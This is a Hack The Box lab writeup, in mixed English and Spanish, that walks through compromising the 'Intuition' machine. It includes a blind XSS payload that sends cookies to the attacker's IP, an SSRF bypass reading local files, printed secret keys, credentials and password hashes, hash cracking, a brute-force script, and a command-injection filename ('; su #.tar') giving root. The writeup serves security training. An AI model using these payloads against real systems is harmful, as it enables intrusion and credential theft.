---
title: "HTB Writeup: Intuition"
author: xpnt
date: 2024-05-05
image:
  path: https://pbs.twimg.com/media/GMBbztCW0AAa-6O?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box]
tags: [labs,urllib,ansible]
---
- We start with a port scan, discovering that ports  `22,80`  are open. Noticing that there is a domain `comprezzor.htb`, we proceed to add it to the `/etc/hosts` file.

>Comments:
>There are various( `unintended` ) ways to obtain root user access, I'll update the post with one of them later.
{: .prompt-tip }

```bash
# Nmap 7.94SVN scan initiated Sat Apr 27 15:02:04 2024 as: nmap -sCV -p 22,80 -n -Pn -oN scanPorts 10.129.53.36
Nmap scan report for 10.129.53.36
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 27 15:02:15 2024 -- 1 IP address (1 host up) scanned in 11.06 seconds
```

- Since port `80` is open and contains the domain `comprezzor.htb`, we proceed to perform virtual host fuzzing using  *gobuster* with the next  [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomains-top100000.txt). We found the vhosts `auth.comprezzor.htb`,`dashboard.comprezzor.htb` and `report.comprezzor.htb`, which we will add to the `/etc/hosts` file.

```bash
> gobuster vhost --url http://comprezzor.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  --append-domain -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://comprezzor.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: auth.comprezzor.htb Status: 302 [Size: 199] [--> /login]
Found: dashboard.comprezzor.htb Status: 302 [Size: 251] [--> http://auth.comprezzor.htb/login]
Found: report.comprezzor.htb Status: 200 [Size: 3166]
===============================================================
Finished
===============================================================
```

- Upon accessing the domain `comprezzor.htb`, we encounter a website that provides file compression service. Additionally , it is mentioned that if a inconvenience with the service arrise, it is posible to send a report through the vhost `report.comprezzor.htb`

![[Pasted image 20240505163054.png]]

- Within `report.comprezzor.htb` we can understand the flow of the report management. Understanding that initially, reported bugsEntendiendo que primero los reported bug is reviewed by developers, but si un bug requires further attention, it will be escalated to out administrators for resolution.

![[Pasted image 20240505163639.png]]

- Para poder enviar un reporte es necesario crearse una cuenta en `auth.comprezzor.htb`, una vez hecho ello podemos enviar nuestro reporte. Dado que los reportes serán revisados en primera instancia por los developers y además las cookies no tiene security attributes establecidos, intentaremos explotar un `Blind XSS` para obtener su cookie.

![[Pasted image 20240505164516.png]]

```post-parameters
report_title=%3Cscript%3Enew+Image%28%29.src%3D%27http%3A%2F%2F10.10.14.162%2Findex%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E&description=%3Cscript%3Enew+Image%28%29.src%3D%27http%3A%2F%2F10.10.14.162%2Findex%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

- Para ello levantaremos un servicio HTTP en el puerto 80 con python y después logramos recuperar la cookie del `developer` que revisó nuestro reporte.

![[Pasted image 20240505165018.png]]
![[Pasted image 20240505165223.png]]

- Como usuario normales no podíamos acceder a `dashboard.comprezzor.htb`, pero ahora que tenemos la cookie del `webdev` user podemos acceder y ver los reportes que aún tiene por revisar.

![[Pasted image 20240505165404.png]]

![[Pasted image 20240505165636.png]]


- Luego de revisar las funcionalidades presente en el dashboard de `webdev`, notamos que podemos set High Priority , presumiblemente para que el reporte sea revisado por el administrador, de  ser ese el caso es probable que podamos secuestrar la cookie del user administrator nuevamente debido a un `Blind XSS`

![[Pasted image 20240505170035.png]]

- Volveremos a enviar un reporte con el mismo payload y esta vez estableceremos High Priority para que pueda ser revisado por el administrador
![[Pasted image 20240505170506.png]]
![[Pasted image 20240505170523.png]]

![[Pasted image 20240505170534.png]]

- Con ello logramos recuperar la cookie del administrator user y podemos acceder al dashboard

![[Pasted image 20240505170919.png]]

- Dentro del administrator dashboard existe una funcionalidad que permite generar un PDF a partir de URL. Generar un PDF con la URL de `localhost`,`127.0.0.1`, etc para explotar un SSRF, no dieron resultado. Por ello para descubrir qué librería se utiliza, nos pondremos en escucha en el puerto 80 con `nc`.

![[Pasted image 20240505171838.png]]

![[Pasted image 20240428232819.png]]

- Al buscar vulnerabilidades relacionadas a `Python-urllib/3.11` nos encontramos con el `CVE-2023-24329`. Dicho CVE consiste en que se permite bypass blocklisting methods by supplying a URL that starts with blank characters.

![[Pasted image 20240505172304.png]]

- Al intentar explotar dicha vulnerabilidad para leer archivos internos tenemos éxito.

![[Pasted image 20240505172817.png]]

![[Pasted image 20240505172831.png]]

- Cookies:
```javascript
admin: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5

webdev: Cookie: user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```


- Uso de `exiftool` en el PDF file, notamos que se está usando la version `wkhtmltopdf 0.12.6`

![[Pasted image 20240428233013.png]]

- Get an idea of how the program was invoked and potentially [see source code location.](https://twitter.com/_JohnHammond/status/1318545091489824769/photo/2) . In this: `/proc/self/cmdline`. [Source](https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for/333329#333329)

![[Pasted image 20240428221237.png]]

- Dado que conozco el directory donde se encuentra el código de la application, recuperé los siguientes files.

`file:///proc/self/environ`

![[Pasted image 20240428221339.png]]

`file:///app/code/app.py`

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```



`file:///app/code/blueprints/dashboard/dashboard.py`

```python
import os
import random
import shutil
import socket
import zipfile
from datetime import datetime
from ftplib import FTP
from urllib.parse import urlparse
import urllib.request

from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
import pdfkit

from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data
from blueprints.report.report_utils import (
    get_report_by_priority,
    get_report_by_id,
    delete_report,
    get_all_reports,
    change_report_priority,
    resolve_report
)

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')
pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')
allowed_hostnames = ['report.comprezzor.htb']

@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()
    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/', methods=['GET'])
@login_required
def get_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required
def del_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    report_id = int(request.args.get('report_id'))
    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] not in ('webdev', 'admin'):
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))
    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    global pdf_report_path
    if request.method == 'POST':
        report_url = request.form.get('report_url')
        try:
            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc
            dissallowed_schemas = ["file", "ftp", "ftps"]
            if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)):
                urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0N
DRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                response = urllib.request.urlopen(urllib_request)
                html_content = response.read().decode('utf-8')
                pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                pdfkit.from_string(html_content, pdf_filename)
                return send_file(pdf_filename, as_attachment=True)
            else:
                flash('Invalid URL', 'error')
                return render_template('dashboard/create_pdf_report.html')
        except Exception as e:
            flash('Unexpected error!', 'error')
            return render_template('dashboard/create_pdf_report.html')
    else:
        return render_template('dashboard/create_pdf_report.html')

@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)
    try:
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()
        os.remove(backup_filename)
        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))

```


`file:///app/code/blueprints/auth/auth.py`

```python
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response
from .auth_utils import *
from werkzeug.security import check_password_hash

app = Flask(__name__)
auth_bp = Blueprint('auth', __name__, subdomain='auth')

@app.route('/')
def index():
    return redirect(url_for('auth.login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if (user is None) or not check_password_hash(user[2], password):
            flash('Invalid username or password', 'error')
            return redirect(url_for('auth.login'))
        serialized_user_data = serialize_user_data(user[0], user[1], user[3])
        flash('Logged in successfully!', 'success')
        response = make_response(redirect(get_redirect_url(user[3])))
        response.set_cookie('user_data', serialized_user_data, domain='.comprezzor.htb')
        return response
    return render_template('auth/login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if user is not None:
            flash('User already exists', 'error')
            return redirect(url_for('auth.register'))
        if create_user(username, password):
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('auth.login'))
        else:
            flash('Unexpected error occurred while trying to register!', 'error')
    return render_template('auth/register.html')

@app.route('/logout')
def logout():
    pass
```

- Cabe mencionar que después de obtener `file:///app/code/blueprints/auth/auth_utils.py`, I tried obtain `file:///app/code/blueprints/auth/users.db`, but not luck. After analysis this part for further privesc.

```python
import sqlite3
import os
import base64
import json
import hmac
import hashlib
from werkzeug.security import generate_password_hash
from functools import wraps
from flask import flash, url_for, redirect, request

SECRET_KEY = 'JS781FJS07SMSAH27SG'
USER_DB_FILE = os.path.join(os.path.dirname(__file__), 'users.db')

def fetch_user_info(username):
    with sqlite3.connect(USER_DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
        user = cursor.fetchone()
        if not user:
            return None
        else:
            return user

def create_user(username, password, role='user'):
    try:
        with sqlite3.connect(USER_DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO users (username, password, role) VALUES (?,?,?)',
                           (username, generate_password_hash(password, 'sha256'), role))
            conn.commit()
        return True
    except Exception as e:
        return False

def serialize_user_data(user_id, username, role):
    data = {'user_id': user_id, 'username': username, 'role': role}
    serialized_data = json.dumps(data).encode('utf-8')
    signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest()
    return base64.b64encode(serialized_data + b'|' + signature.encode('utf-8')).decode('utf-8')

def deserialize_user_data(serialized_data):
    serialized_data = base64.b64decode(serialized_data)
    serialized_data, received_signature = serialized_data.rsplit(b'|', 1)
    expected_signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest()
    if hmac.compare_digest(expected_signature.encode('utf-8'), received_signature):
        decoded_data = serialized_data.decode('utf-8')
        return json.loads(decoded_data)
    else:
        return None

def get_redirect_url(user_role):
    if user_role == 'user':
        return url_for('report.report_index')
    else:
        return url_for('dashboard.dashboard')

def admin_required(view_func):
    @wraps(view_func)
    def decorated_view(*args, **kwargs):
        user_data = request.cookies.get('user_data')
        if not user_data:
            flash('You need to log in to access this page.', 'error')
            return redirect(url_for('auth.login'))
        user_info = deserialize_user_data(user_data)
        if user_info['role'] not in ['admin', 'webdev']:
            flash('Not enough permissions. Login as an administrator user to access this resource', 'error')
            return redirect(url_for('auth.login'))
        return view_func(*args, **kwargs)
    return decorated_view

def login_required(view_func):
    @wraps(view_func)
    def decorated_view(*args, **kwargs):
        user_data = request.cookies.get('user_data')
        if not user_data:
            flash('You need to log in to access this page.', 'error')
            return redirect(url_for('auth.login'))
        return view_func(*args, **kwargs)
    return decorated_view
```



- Después de analizar los files, notamos la existencia de un servicio FTP interno del cual poseemos las credenciales(`ftp_admin:u3jai8y71s2`).

`ftp://ftp_admin:u3jai8y71s2@ftp_local`
![[Pasted image 20240428220526.png]]

- Al acceder notamos la existencia de una clave `id_rsa` la cual está encriptada con una `passphrase` .

`ftp://ftp_admin:u3jai8y71s2@ftp_local/private-8297.key`
![[Pasted image 20240428221625.png]]

- La passphrase necesaria para usar la `id_rsa` se encuentra en el file `welcome_note.txt`

`ftp://ftp_admin:u3jai8y71s2@ftp_local/welcome_note.txt`

![[Pasted image 20240428220454.png]]

- Una forma de Check if SSH private key has passphrase or not es la siguiente. [Source](https://security.stackexchange.com/a/129729)

```bash
ssh-keygen -y -P "" -f id_rsa
# Passphrase : Y27SH19HDIWD
```

![[Pasted image 20240429005301.png]]

- Dado que obtuvimos la `id_rsa` podemos generar el `id_rsa.pub`, after I discovered que la `id_rsa` le pertenece al user `dev_acc`

![[Pasted image 20240429005538.png]]

- Use `ssh-add` and `ssh_agent` to add id_rsa private key for SSH. [Source](https://juncotic.com/ssh-agent-que-es-y-como-funciona/). [Other Source](https://superuser.com/a/990447)

![[Pasted image 20240429010550.png]]

- Finalmente con ello podemos ingresar a través del servicio SSH con  la cuenta `dev_acc` y leer el `user.txt`

![[Pasted image 20240503161101.png]]

- Previosly I saw users.db database file. Como estamos dentro de un shell, intenté recuperar dicho archivo and discovered that is SQLite3 database. Al acceder a dicho SQLite3 database encontré los hash de las contraseñas pertenecientes al user `admin` y `webdev`
![[Pasted image 20240429011908.png]]

- Dado que el hash es proveniente de `Python Werkzeug` Module. [How to crack hash Werkzeug ](https://github.com/hashcat/hashcat/issues/3205)
```python
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
```

- Para crackearlos usé `Hashcat`
```bash
hashcat.exe -m 1460 a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:Z7bcBO9P43gvdQWp c:\rockyou.txt --show
# adam gray
```

- That's password is for user `adam` not function to SSH service, but after I searched for directories or files that belong at user or group `adam` . I saw `/opt/ftp` directory and to enter I saw directory for adam user, so I tried credentials before encounter for FTP service

![[Pasted image 20240429011539.png]]

- I connected to FTP service with credentials `adam:adam gray` and download files

![[Pasted image 20240429014820.png]]


- Notamos que el `runner1` binary file necesita una authentication key para poder ejecutarse.

![[Pasted image 20240505182637.png]]

- Revisando el código `runner1.c` , el `authentication key` es correcto si el hash md5 es igual a `0feda17076d793c2ef2870d7427ad4ed`. Adicionalmente el `run-tests.sh` script muestra parte de la `authentication key` (`UHI75GHI****`), dándonos a entender que está compuesta de 12 caracteres.

![[Pasted image 20240505190933.png]]

- Es por ello que creé un código en `python3` que bruteforce los caracteres faltantes de dicho `auth_key`. Logrando descubrir que el `auth_key` es `UHI75GHINKOP`.

```python
import hashlib
import random
import string

AUTH_KEY_HASH = "0feda17076d793c2ef2870d7427ad4ed"

def generate_random_key():
    # Define allowed characters: digits and uppercase letters
    allowed_characters = string.digits + string.ascii_uppercase
    
    # Generate a random key of 4 characters by selecting randomly from the allowed characters
    random_suffix = ''.join(random.choice(allowed_characters) for _ in range(4))
    
    # Concatenate the first 8 known characters with the last 4 random characters
    random_key = 'UHI75GHI' + random_suffix
    
    return random_key

def brute_force():
    # Try to find the key that matches the AUTH_KEY_HASH
    while True:
        # Generate a new random key
        key = generate_random_key()
        
        # Calculate the MD5 hash of the generated key
        md5_hash = hashlib.md5(key.encode()).hexdigest()
        
        # If the hash matches the AUTH_KEY_HASH, the correct key has been found
        if md5_hash == AUTH_KEY_HASH:
            return key

# Perform the brute force attack
found_key = brute_force()

# Print the found key
print("Found Key:", found_key)

```

![[Pasted image 20240505191641.png]]

-  Sin embargo a pesar del `auth_key` correcto, no podemos ejecutar nada pues no poseemos los permisos necesarios. I analized code of the file runner1.c and I saw that this code use los siguientes files.
![[Pasted image 20240505192215.png]]
![[Pasted image 20240429015143.png]]

- This files to belong at group `sys_adm`

![[Pasted image 20240429015522.png]]

- Los miembros del grupo `sys_adm` son los usuarios  `adam` y `lopez`

![[Pasted image 20240429015533.png]]

- So, at this point the goal is convert in any of the above users. I execute `linpeas.sh` and I saw a lot of backup files, in specific in the directory `/var/log/suricata`.

![[Pasted image 20240429014004.png]]

-  We know that Suricata is an open-source detection engine that can act as an intrusion detection system(IDS) and an intrusion prevention system(IPS). Entonces es posible que registre los inicios de sesión válidos e inválidos, es por ello que es un buen lugar para buscar alguna credencial de algún servicio en específico, perteneciente a alguno de los usuarios `adam` y `lopez`.

![[Pasted image 20240503162040.png]]

- Dado que no tenemos permisos de escritura en el directorio `/var/log/suricata`, realizaremos una copia al directorio `/dev/shm` para poder realizar descomprimir the contents of all .gz files. Luego de descomprimir los .gz files(`gunzip *.gz`), procederemos  a filtrar por la palabra `pass` en todos los archivos.

![[Pasted image 20240503163936.png]]

- Debido a que son muchas líneas las que contienen la palabra `pass`. Un enfoque más sencillo sería filtrar por los nombres de usuario `adam` y `lopez`. Al filtrar por la palabra `lopez` notamos que **Suricata** ha registrado unos inicios de sesión al servicio FTP.

![[Pasted image 20240503164414.png]]

- Con lo anterior observamos que la password del servicio FTP para el user `lopez` es `Lopezz1992%123`. Intemos las mismas credenciales para el servicio SSH y logramos acceder exitosamente como el user `lopez`

![[Pasted image 20240503165749.png]]

- Notamos que podemos ejecutar el `runner2` binary file como `root`[*(Source)*](https://askubuntu.com/a/1318933), dicho binario es muy parecido al binario `runner1` del cual tenemos su código. Para realizar un mayor análisis, Reverse Engineering, utilizaremos `Ghidra` con una copia del binary file `runner2`

![[Pasted image 20240504132058.png]]

- Analizando la función `main` notamos que se espera un `JSON` file correctamente formado como parámetro para el binary file `runner2`

![[Pasted image 20240504214102.png]]

- Para saber la estructura del  `JSON` file que será aceptado por el `runner2` binary, seguimos leyendo el código. Notando que espera una key `run` el cuál tiene como value un `JSON` object. Cabe mencionar que el hecho de que sepamos que `runner2` binary espera un JSON object como value es debido a la presencia de `*pointer_run !=0`.

![[Pasted image 20240504220132.png]]

- Para entender mejor las comparativas del tipo `*pointer_run != 0`, utilizaremos el siguiente código en C. Una explicación más profunda del concepto de `C dereference pointer` [aquí](https://www.javatpoint.com/c-dereference-pointer#:~:text=The%20dereference%20operator%20is%20also,known%20as%20dereferencing%20a%20pointer.).

```c
#include <jansson.h>

int *myvar;

int main() {
    // Create a JSON object
    json_t *json_obj = json_object();

    // Load a JSON object from a JSON string
    const char *json_str = "{\"name\": \"John\", \"age\": 30, \"other\": {\"a\":\"b\"} }";
    json_error_t error;
    json_t *root = json_loads(json_str, 0, &error);

    // Get a value for the key "other" from a JSON object which also happens to be a JSON object
    myvar = (int *)json_object_get(root, "other");
    printf("The address stored by the pointer is: %p\n", (void *)myvar);
    
    // Print the value after casting the value (JSON object) to integer due to pointer to an integer
    printf("The value of *myvar after JSON object to integer casting is: %d\n", *myvar);
    
    // Get a value for the key "name" in the JSON object
    json_t *name_obj = json_object_get(root, "name");
    if (json_is_string(name_obj)) {
        myvar = (int *)json_object_get(root, "name");
        // Print the value after casting the value (String) to integer, due to pointer to an integer
        printf("The value of *myvar after String to integer casting is: %d\n", *myvar);
        printf("Name: %s\n", json_string_value(name_obj));
    }

    // Free memory
    json_decref(root);

    return 0;
}
```

![[Pasted image 20240504223507.png]]

- Debido a las comparaciónes señaladas, es posible inferir la estructura del JSON file aceptado. 

![[Pasted image 20240504224047.png]]

![[Pasted image 20240504230929.png]]

```json
{
"run":{
	"action":"list"
	},
"auth_code":"<auth_code>"
}
```

![[Pasted image 20240505150220.png]]

```json
{
"run":{
	"action":"run",
	"num": <integer>
	},
"auth_code":"<auth_code>"
}
```

![[Pasted image 20240505150656.png]]

```json
{
"run":{
	"action":"install",
	"role_file":"<tar_file>"
	},
"auth_code":"<auth_code>"
}
```

- Después de haber revisado el código, notamos que ciertas partes del código son similares al binary file `runner1`, es por ello que la vulnerabilidad de  `Command Injection` que ocurría en `runner1`, aún está presente en `runner2`.

![[Pasted image 20240505151821.png]]
![[Pasted image 20240505152051.png]]

- Para explotarla es necesario crear un correcto `tarball`, es por ello que  revisaremos el código para verificar que cumpla las validaciones hasta que llegue a llamar a la funcion `system()`.

![[Pasted image 20240505152051.png]]

- Después de que revisamos la función `isTarArchive`, lo que hace básicamente es comprobar que el `tar file` esté correctamente formado para poder leer los  `headers`, razón por la cual basta con crear un archivo y luego crear un  `tarball` que lo contenga.

![[Pasted image 20240505154954.png]]

- Finalmente para explotar el `Command Injection`, crearemos una carpeta `pwn` la cual contendrá un archivo(`pwned.txt`).
![[Pasted image 20240504130514.png]]

- Luego procederemos a crear el archivo `tar` y a renombrarlo para poder explotar el `Command Injection` vulnerability.
![[Pasted image 20240504131156.png]]

- Para después crear el JSON file (`malicious.json`) con el siguiente contenido.
![[Pasted image 20240504130758.png]]

- Luego ejecutaremos el `runner2` binary como `root` y obtendremos una instancia de la shell Bash con los privilegios de `root`.

![[Pasted image 20240504131945.png]]


- Flags en funcion `json_loadf`.[Source](https://jansson.readthedocs.io/en/2.3/apiref.html#encoding)
- Pointers en C. [Source](https://www.javatpoint.com/c-dereference-pointer#:~:text=The%20dereference%20operator%20is%20also,known%20as%20dereferencing%20a%20pointer.)








```
adam gray
UHI75GHINKOP
```

- Host disponibles
```bash
172.21.0.4
10.10.10.2
172.21.0.2




Credentials : lopez : Lopezz1992%123
cp *gz /dev/shm


./runner1 run 1 -a UHI75GHINKOP

lopez@intuition:~$ cat pwned.yml
---
- name: test play
  hosts: localhost

  tasks:
    - name: first task
      command: /home/lopez/pwn.sh

./runner1 install http://10.10.14.45/  -a UHI75GHINKOP

./runner1 install http://0.10.14.45/pwnpwn.tar -a UHI75GHINKOP

{ 
"resources":[
           {"name":"miodemi", "downloadURL":"http://10.10.14.45/pwnpwn.tar" }
   ]
}

{ 
"action":"install"
"list" :"http://10.10.14.45"
"auth_code" :"UHI75GHINKOP"
}




{ "run": { "action": "install", "role_file": "; su #.tar" }, "auth_code": "UHI75GHINKOP" } mv a.tar '; su #.tar' tar cvf a.tar bash.txt sudo and got root















{ "resources":[
           {"name":"package1", "downloadURL":"path-to-file1" },
           {"name":"package2", "downloadURL": "path-to-file2"}
   ]
}

{
    "run":{
        "action":"install",
        "auth_code":"UHI75GHINKOP",
        "role_file":"/dev/shm/pwnpwn.tar",
        "dest_dir":"/dev/shm/pwn"
    },
    "auth_code":"UHI75GHINKOP",
    "action":"install",
    "role_file":"/dev/shm/pwnpwn.tar",
    "dest_dir":"/dev/shm/pwn"
}



{
    "run": {
        "action": "install",
        "role_file": "; su #.tar"
    },
    "auth_code": "UHI75GHINKOP"
}

mv a.tar '; su #.tar'
tar cvf a.tar bash.txt 
sudo and got root

```


https://www.hackthebox.com/achievement/machine/1504363/599